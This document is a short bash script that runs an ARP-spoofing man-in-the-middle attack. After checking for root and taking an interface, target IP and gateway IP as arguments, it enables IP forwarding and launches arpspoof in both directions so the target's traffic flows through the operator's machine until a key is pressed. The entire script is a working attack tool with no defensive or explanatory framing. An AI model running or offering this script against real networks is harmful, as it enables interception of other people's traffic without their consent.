#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "You must be root"
    exit 1
fi

if [[ $# -ne 3 ]]; then
    echo "filename.sh [NetworkInterface] [Target IP] [Gatway IP]"
    exit 1
fi

echo 1 > /proc/sys/net/ipv4/ip_forward

arpspoof -i $1 -t $2 $3 &> /dev/null  &
PID1=$!
arpspoof -i $1 -t $3 $2 &> /dev/null  &
PID2=$!

echo "Press any key to stop spoofing..."
read

kill -9 $PID1 $PID2
echo 0 > /proc/sys/net/ipv4/ip_forward

exit 0

